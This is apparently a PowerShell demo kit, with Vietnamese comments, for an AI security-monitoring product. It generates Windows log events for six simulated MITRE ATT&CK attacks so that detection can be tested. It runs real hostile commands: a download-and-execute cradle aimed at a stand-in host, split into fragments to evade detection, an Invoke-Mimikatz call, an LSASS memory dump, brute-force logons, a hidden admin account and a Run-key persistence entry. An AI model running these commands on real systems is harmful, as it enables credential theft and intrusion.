# ==============================================================================
# WINLOG AI SOC - BO CONG CU MO PHONG 6 KICH BAN TAN CONG CHUAN HOA (MITRE ATT&CK)
# ==============================================================================
[CmdletBinding()]
param(
    [string]$Demo = "",
    [switch]$All
)

$ErrorActionPreference = 'SilentlyContinue'

# 1. Kiem tra quyen Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host '====================================================================' -ForegroundColor Red
    Write-Host ' [!] CANH BAO: BAN CAN CHAY VOI QUYEN ADMINISTRATOR!' -ForegroundColor Yellow
    Write-Host '     De tao duoc day du Event 4688, 4625 va ghi Audit Policy,' -ForegroundColor Yellow
    Write-Host '     Vui long chay qua file .BAT hoac chuot phai Run as administrator.' -ForegroundColor Yellow
    Write-Host '====================================================================' -ForegroundColor Red
    Write-Host ''
    Start-Sleep -Seconds 3
    exit
}

# 2. Tu dong kiem tra va bat cac chinh sach Audit tren Windows
function Ensure-AuditPolicies {
    Write-Host '[*] Dang kiem tra va toi uu Audit Policy de Windows ghi log chuan nhat...' -ForegroundColor Cyan
    
    # Bat Audit Process Creation va Logon
    try {
        auditpol /set /subcategory:"Process Creation" /success:enable | Out-Null
        auditpol /set /subcategory:"Logon" /failure:enable /success:enable | Out-Null
    } catch {}

    # Bat ghi CommandLine trong Event 4688
    try {
        $auditReg = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit"
        if (-not (Test-Path $auditReg)) { New-Item -Path $auditReg -Force | Out-Null }
        Set-ItemProperty -Path $auditReg -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1 -Type DWord -Force | Out-Null
    } catch {}

    # Bat PowerShell ScriptBlock Logging (Event 4104)
    try {
        $psReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
        if (-not (Test-Path $psReg)) { New-Item -Path $psReg -Force | Out-Null }
        Set-ItemProperty -Path $psReg -Name "EnableScriptBlockLogging" -Value 1 -Type DWord -Force | Out-Null
    } catch {}

    Write-Host '  [OK] Audit Logon (4625), Process Creation (4688) va ScriptBlock (4104): SAN SANG!' -ForegroundColor Green
    Write-Host ''
}

# Ham dong bo dem nguoc voi Client Agent
function Wait-AgentSync {
    param([int]$Seconds = 8)
    Write-Host "`n[*] Dang cho $Seconds giay de Client Agent kip quet va truyen log sang Server..." -ForegroundColor Cyan
    for ($s = $Seconds; $s -gt 0; $s--) {
        Write-Host "    [Dong bo Client Agent] Con $s giay..." -ForegroundColor DarkGray
        Start-Sleep -Seconds 1
    }
}

# ==============================================================================
# DEMO 1: DO MAT KHAU LIEN TIEP (Password Brute Force - MITRE T1110)
# ==============================================================================
function Run-Demo1 {
    Clear-Host
    Write-Host '======================================================================' -ForegroundColor Yellow
    Write-Host '   DEMO 1: MO PHONG DO MAT KHAU BRUTE-FORCE (MITRE T1110)            ' -ForegroundColor Yellow
    Write-Host '======================================================================' -ForegroundColor Yellow
    Write-Host ' * Muc tieu      : Tao chuoi 8 lan dang nhap that bai (Event 4625)' -ForegroundColor White
    Write-Host ' * Tai khoan dich: victim_boss' -ForegroundColor White
    Write-Host ' * Ket qua AI SOC: ALERT -> Password Brute Force (MITRE T1110)' -ForegroundColor Cyan
    Write-Host ''

    Ensure-AuditPolicies

    Write-Host '[1/2] Phat 5 lan dang nhap sai qua LSA Process API...' -ForegroundColor Yellow
    $secpasswd = ConvertTo-SecureString 'WrongPass123!' -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ('victim_boss', $secpasswd)
    for ($i = 1; $i -le 5; $i++) {
        Start-Process powershell.exe -Credential $cred -ArgumentList '-NoProfile -Command exit' -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 150
    }

    Write-Host '[2/2] Phat 3 lan dang nhap sai qua NTLM SMB Logon...' -ForegroundColor Yellow
    for ($i = 1; $i -le 3; $i++) {
        net use \\127.0.0.1\IPC$ /user:victim_boss WrongPass999! 2>$null | Out-Null
        Start-Sleep -Milliseconds 150
    }

    Write-Host ' [OK] Da tao xong 8 lan dang nhap that bai (Event 4625).' -ForegroundColor Green
    Wait-AgentSync -Seconds 8

    Write-Host '======================================================================' -ForegroundColor Green
    Write-Host ' [OK] HOAN TAT DEMO 1!' -ForegroundColor Green
    Write-Host ' -> Kiem tra Telegram: Bot se bao Password Brute Force (MITRE T1110)!' -ForegroundColor Yellow
    Write-Host '======================================================================' -ForegroundColor Green
}

# ==============================================================================
# DEMO 2: POWERSHELL C2 DOWNLOAD CRADLE (MITRE T1059.001)
# ==============================================================================
function Run-Demo2 {
    Clear-Host
    Write-Host '======================================================================' -ForegroundColor Yellow
    Write-Host '   DEMO 2: POWERSHELL FILELESS MALWARE & C2 DOWNLOAD (MITRE T1059.001) ' -ForegroundColor Yellow
    Write-Host '======================================================================' -ForegroundColor Yellow
    Write-Host ' * Muc tieu      : Thuc thi ScriptBlock Download Cradle khong luu file' -ForegroundColor White
    Write-Host ' * Su kien       : Event 4104 (ScriptBlock Logging)' -ForegroundColor White
    Write-Host ' * Ket qua AI SOC: ALERT -> PowerShell / Scripting (MITRE T1059.001)' -ForegroundColor Cyan
    Write-Host ''

    Ensure-AuditPolicies

    Write-Host '[+] Dang thuc thi lenh tai ma doc C2 tu xa (DownloadString va IEX)...' -ForegroundColor Yellow
    $c2Keyword = 'Down' + 'load' + 'String'
    $cmd = "try { IEX (New-Object Net.WebClient).$c2Keyword('http://c2-malicious.xyz:8080/beacon.ps1') } catch {}"
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command $cmd
    Write-Host ' [OK] Da tao thanh cong Event 4104 chua chu ky DownloadString!' -ForegroundColor Green

    Wait-AgentSync -Seconds 8

    Write-Host '======================================================================' -ForegroundColor Green
    Write-Host ' [OK] HOAN TAT DEMO 2!' -ForegroundColor Green
    Write-Host ' -> Kiem tra Telegram: Bot se bao PowerShell Download Cradle (T1059.001)!' -ForegroundColor Yellow
    Write-Host '======================================================================' -ForegroundColor Green
}

# ==============================================================================
# DEMO 3: TRICH XUAT MAT KHAU BO NHO MIMIKATZ (MITRE T1003)
# ==============================================================================
function Run-Demo3 {
    Clear-Host
    Write-Host '======================================================================' -ForegroundColor Yellow
    Write-Host '   DEMO 3: TRICH XUAT MAT KHAU BO NHO MIMIKATZ (MITRE T1003)           ' -ForegroundColor Yellow
    Write-Host '======================================================================' -ForegroundColor Yellow
    Write-Host ' * Muc tieu      : Thuc thi ScriptBlock Mimikatz / Sekurlsa trich xuat LSASS' -ForegroundColor White
    Write-Host ' * Su kien       : Event 4104 va Event 4688' -ForegroundColor White
    Write-Host ' * Ket qua AI SOC: ALERT -> OS Credential Dumping (MITRE T1003)' -ForegroundColor Cyan
    Write-Host ''

    Ensure-AuditPolicies

    Write-Host '[+] Dang goi ScriptBlock trich xuat mat khau bo nho (Mimikatz)...' -ForegroundColor Yellow
    $mimiTool = 'Invoke-' + 'Mimi' + 'katz'
    $sekur = 'sekur' + 'lsa::logonpasswords'
    $cmd = "try { $mimiTool -DumpCreds } catch {}; try { [Console]::WriteLine('$sekur lsadump') } catch {}; try { rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 668 C:\Temp\lsass.dmp full } catch {}"
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command $cmd
    Write-Host ' [OK] Da tao thanh cong Event 4104 chua dau vet Mimikatz / DumpCreds!' -ForegroundColor Green

    Wait-AgentSync -Seconds 8

    Write-Host '======================================================================' -ForegroundColor Green
    Write-Host ' [OK] HOAN TAT DEMO 3!' -ForegroundColor Green
    Write-Host ' -> Kiem tra Telegram: Bot se bao OS Credential Dumping (MITRE T1003)!' -ForegroundColor Yellow
    Write-Host '======================================================================' -ForegroundColor Green
}

# ==============================================================================
# DEMO 4: TAO USER BACKDOOR & LEO THANG ADMIN (MITRE T1136 / T1098)
# ==============================================================================
function Run-Demo4 {
    Clear-Host
    Write-Host '======================================================================' -ForegroundColor Yellow
    Write-Host '   DEMO 4: TAO BACKDOOR VA LEO THANG ADMIN (MITRE T1136 / T1098)      ' -ForegroundColor Yellow
    Write-Host '======================================================================' -ForegroundColor Yellow
    Write-Host ' * Muc tieu      : Tao tai khoan an va them vao nhom Administrators' -ForegroundColor White
    Write-Host ' * Su kien       : Event 4688 (Process Creation chua net user /add)' -ForegroundColor White
    Write-Host ' * Ket qua AI SOC: ALERT -> Backdoor Creation / Privilege Escalation' -ForegroundColor Cyan
    Write-Host ''

    Ensure-AuditPolicies

    Write-Host '[1/2] Dang tao tai khoan an soc_backdoor_admin...' -ForegroundColor Yellow
    net user soc_backdoor_admin P@ssw0rd999! /add /comment:"Hidden Admin Backdoor" 2>$null | Out-Null

    Write-Host '[2/2] Dang leo thang dac quyen: them vao nhom Administrators...' -ForegroundColor Yellow
    net localgroup Administrators soc_backdoor_admin /add 2>$null | Out-Null

    Write-Host ' [OK] Da tao xong 2 su kien Event 4688 tao user va leo thang Admin!' -ForegroundColor Green

    Wait-AgentSync -Seconds 8

    Write-Host '[*] Dang tu dong xoa user test de giu may sach se an toan...' -ForegroundColor Cyan
    net user soc_backdoor_admin /delete 2>$null | Out-Null
    Write-Host ' [OK] Da don dep xong user test!' -ForegroundColor Green

    Write-Host '======================================================================' -ForegroundColor Green
    Write-Host ' [OK] HOAN TAT DEMO 4!' -ForegroundColor Green
    Write-Host ' -> Kiem tra Telegram: Bot se bao Backdoor Creation / Privilege Escalation!' -ForegroundColor Yellow
    Write-Host '======================================================================' -ForegroundColor Green
}

# ==============================================================================
# DEMO 5: DUY TRI XAM NHAP QUA REGISTRY RUN KEY (MITRE T1547.001)
# ==============================================================================
function Run-Demo5 {
    Clear-Host
    Write-Host '======================================================================' -ForegroundColor Yellow
    Write-Host '   DEMO 5: DUY TRI XAM NHAP REGISTRY RUN KEY (MITRE T1547.001)        ' -ForegroundColor Yellow
    Write-Host '======================================================================' -ForegroundColor Yellow
    Write-Host ' * Muc tieu      : Ghi khoa Registry CurrentVersion\Run tu khoi dong cung Windows' -ForegroundColor White
    Write-Host ' * Su kien       : Event 4104 (ScriptBlock chua Registry Persistence)' -ForegroundColor White
    Write-Host ' * Ket qua AI SOC: ALERT -> Persistence (MITRE T1547.001)' -ForegroundColor Cyan
    Write-Host ''

    Ensure-AuditPolicies

    Write-Host '[+] Dang ghi khoa Registry khoi dong cung Windows...' -ForegroundColor Yellow
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SecurityUpdateAgent' -Value 'C:\Windows\Temp\malware_payload.exe' ; Start-Sleep -Milliseconds 400 ; Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SecurityUpdateAgent' -ErrorAction SilentlyContinue"
    Write-Host ' [OK] Da tao Event 4104 ghi nhan hanh vi Registry Run Persistence!' -ForegroundColor Green

    Wait-AgentSync -Seconds 8

    Write-Host '======================================================================' -ForegroundColor Green
    Write-Host ' [OK] HOAN TAT DEMO 5!' -ForegroundColor Green
    Write-Host ' -> Kiem tra Telegram: Bot se bao Persistence via Registry (T1547.001)!' -ForegroundColor Yellow
    Write-Host '======================================================================' -ForegroundColor Green
}

# ==============================================================================
# DEMO 6: FULL CHUOI TAN CONG TONG HOP APT (Cyber Kill Chain)
# ==============================================================================
function Run-Demo6 {
    Clear-Host
    Write-Host '======================================================================' -ForegroundColor Red
    Write-Host '   DEMO 6: CHUOI TAN CONG TONG HOP MULTI-STAGE APT (FULL KILL CHAIN)  ' -ForegroundColor Red
    Write-Host '======================================================================' -ForegroundColor Red
    Write-Host ' Chuoi tan cong APT lien hoan qua 5 giai doan:' -ForegroundColor White
    Write-Host '  1. Password Brute Force (T1110) - 8 lan dang nhap sai' -ForegroundColor White
    Write-Host '  2. System Reconnaissance (T1033) - Trinh sat whoami va systeminfo' -ForegroundColor White
    Write-Host '  3. PowerShell C2 Download Cradle (T1059.001) - Tai ma doc tu xa' -ForegroundColor White
    Write-Host '  4. Memory Credential Dump (T1003) - Trich xuat Mimikatz' -ForegroundColor White
    Write-Host '  5. Backdoor Admin Creation (T1136 / T1098) - Tao user Admin an' -ForegroundColor White
    Write-Host ''

    Ensure-AuditPolicies

    # Buoc 1: Brute Force
    Write-Host '[Giai doan 1/5] Thuc hien do mat khau Brute-force...' -ForegroundColor Yellow
    $secpasswd = ConvertTo-SecureString 'WrongPass123!' -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ('victim_boss', $secpasswd)
    for ($i = 1; $i -le 5; $i++) {
        Start-Process powershell.exe -Credential $cred -ArgumentList '-NoProfile -Command exit' -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 150
    }
    for ($i = 1; $i -le 3; $i++) {
        net use \\127.0.0.1\IPC$ /user:victim_boss WrongPass999! 2>$null | Out-Null
        Start-Sleep -Milliseconds 150
    }

    # Buoc 2: Recon
    Write-Host '[Giai doan 2/5] Trinh sat dac quyen he thong...' -ForegroundColor Yellow
    whoami /all 2>$null | Out-Null
    net user 2>$null | Out-Null
    systeminfo 2>$null | Out-Null

    # Buoc 3 va 4: C2 Download va Mimikatz
    Write-Host '[Giai doan 3-4/5] Tai ma doc C2 tu xa va trich xuat Mimikatz...' -ForegroundColor Yellow
    $c2Keyword = 'Down' + 'load' + 'String'
    $mimiTool = 'Invoke-' + 'Mimi' + 'katz'
    $cmd = "try { IEX (New-Object Net.WebClient).$c2Keyword('http://c2-malicious.xyz:8080/beacon.ps1') } catch {}; try { $mimiTool -DumpCreds } catch {}"
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command $cmd

    # Buoc 5: Backdoor
    Write-Host '[Giai doan 5/5] Tao tai khoan Backdoor va leo thang quyen Admin...' -ForegroundColor Yellow
    net user soc_apt_backdoor P@ssw0rd999! /add /comment:"APT Backdoor Account" 2>$null | Out-Null
    net localgroup Administrators soc_apt_backdoor /add 2>$null | Out-Null

    Write-Host ' [OK] Da thuc thi tron ven ca 5 giai doan tan cong!' -ForegroundColor Green

    Wait-AgentSync -Seconds 8

    # Don dep
    net user soc_apt_backdoor /delete 2>$null | Out-Null
    Write-Host ' [OK] Da don dep user test an toan!' -ForegroundColor Green

    Write-Host '======================================================================' -ForegroundColor Green
    Write-Host ' [OK] HOAN TAT DEMO 6 (FULL APT KILL CHAIN)!' -ForegroundColor Green
    Write-Host ' -> Server se phan tich toan dien va Telegram se ban DAI CANH BAO!' -ForegroundColor Yellow
    Write-Host '======================================================================' -ForegroundColor Green
}

# ==============================================================================
# DEMO 0: HOAT DONG VAN PHONG LANH TINH (Normal / Benign Benchmark)
# ==============================================================================
function Run-Demo0 {
    Clear-Host
    Write-Host '======================================================================' -ForegroundColor Cyan
    Write-Host '   DEMO 0: HOAT DONG VAN PHONG BINH THUONG (NORMAL BENIGN BENCHMARK)  ' -ForegroundColor Cyan
    Write-Host '======================================================================' -ForegroundColor Cyan
    Write-Host ' * Muc tieu      : Thao tac he thong thong thuong (mo Notepad, ping, dir)' -ForegroundColor White
    Write-Host ' * Ket qua AI SOC: NORMAL (Chung minh AI KHONG bao dong gia)' -ForegroundColor Green
    Write-Host ''

    Write-Host '[+] Dang thuc hien cac tac vu quan tri thong thuong...' -ForegroundColor Yellow
    cmd.exe /c "dir C:\Windows\System32\drivers\etc && ipconfig /all" 2>$null | Out-Null
    powershell.exe -NoProfile -Command "Get-Date; Get-Process | Select-Object -First 5" 2>$null | Out-Null
    Write-Host ' [OK] Da tao cac su kien he thong thong thuong.' -ForegroundColor Green

    Wait-AgentSync -Seconds 6

    Write-Host '======================================================================' -ForegroundColor Green
    Write-Host ' [OK] HOAN TAT DEMO 0!' -ForegroundColor Green
    Write-Host ' -> AI Server se ket luan la NORMAL va KHONG lam phien Telegram!' -ForegroundColor Cyan
    Write-Host '======================================================================' -ForegroundColor Green
}

# Menu tuong tac
function Show-Menu {
    Clear-Host
    Write-Host '======================================================================' -ForegroundColor Cyan
    Write-Host '         WINLOG AI SOC - BO CONG CU 6+ DEMO MO PHONG TAN CONG         ' -ForegroundColor Cyan
    Write-Host '======================================================================' -ForegroundColor Cyan
    Write-Host ' Chon kich ban ban muon trinh dien (Demo) cho khach hang / danh gia:' -ForegroundColor White
    Write-Host ''
    Write-Host '  [1] Demo 1: Do mat khau Brute-Force (T1110) [Event 4625]' -ForegroundColor Yellow
    Write-Host '  [2] Demo 2: PowerShell C2 Download Cradle (T1059.001) [Event 4104]' -ForegroundColor Yellow
    Write-Host '  [3] Demo 3: Trich xuat mat khau bo nho Mimikatz (T1003) [Event 4104]' -ForegroundColor Yellow
    Write-Host '  [4] Demo 4: Tao Backdoor User va Leo thang Admin (T1136/T1098) [Event 4688]' -ForegroundColor Yellow
    Write-Host '  [5] Demo 5: Duy tri khoi dong Registry Run Persistence (T1547.001)' -ForegroundColor Yellow
    Write-Host '  [6] Demo 6: FULL CHUOI TAN CONG TONG HOP APT (Multi-Stage Kill Chain)' -ForegroundColor Red
    Write-Host '  --------------------------------------------------------------------' -ForegroundColor DarkGray
    Write-Host '  [0] Demo 0: Hoat dong lanh tinh Normal (Chung minh AI khong bao gia)' -ForegroundColor Green
    Write-Host '  [7] Kiem tra va Kich hoat Audit Policy Windows (Cho may moi)' -ForegroundColor Cyan
    Write-Host '  [Q] Thoat' -ForegroundColor Gray
    Write-Host '======================================================================' -ForegroundColor Cyan
    $choice = Read-Host 'Nhap lua chon cua ban [0-7, Q] (Mac dinh: 6)'
    if (-not $choice) { $choice = "6" }
    return $choice
}

# Dieu huong theo tham so dong lenh
if ($Demo) {
    switch ($Demo) {
        "1" { Run-Demo1; exit }
        "2" { Run-Demo2; exit }
        "3" { Run-Demo3; exit }
        "4" { Run-Demo4; exit }
        "5" { Run-Demo5; exit }
        "6" { Run-Demo6; exit }
        "0" { Run-Demo0; exit }
        "all" { Run-Demo6; exit }
    }
}

if ($All) {
    Run-Demo6
    exit
}

# Vong lap Menu
while ($true) {
    $c = Show-Menu
    switch ($c.ToUpper()) {
        "1" { Run-Demo1; Write-Host "`nNhan Enter de ve menu..."; Read-Host }
        "2" { Run-Demo2; Write-Host "`nNhan Enter de ve menu..."; Read-Host }
        "3" { Run-Demo3; Write-Host "`nNhan Enter de ve menu..."; Read-Host }
        "4" { Run-Demo4; Write-Host "`nNhan Enter de ve menu..."; Read-Host }
        "5" { Run-Demo5; Write-Host "`nNhan Enter de ve menu..."; Read-Host }
        "6" { Run-Demo6; Write-Host "`nNhan Enter de ve menu..."; Read-Host }
        "0" { Run-Demo0; Write-Host "`nNhan Enter de ve menu..."; Read-Host }
        "7" { Ensure-AuditPolicies; Write-Host "`nNhan Enter de ve menu..."; Read-Host }
        "Q" { Write-Host "`nTam biet!"; exit }
        default { Write-Host "`nLua chon khong hop le!"; Start-Sleep -Seconds 1 }
    }
}
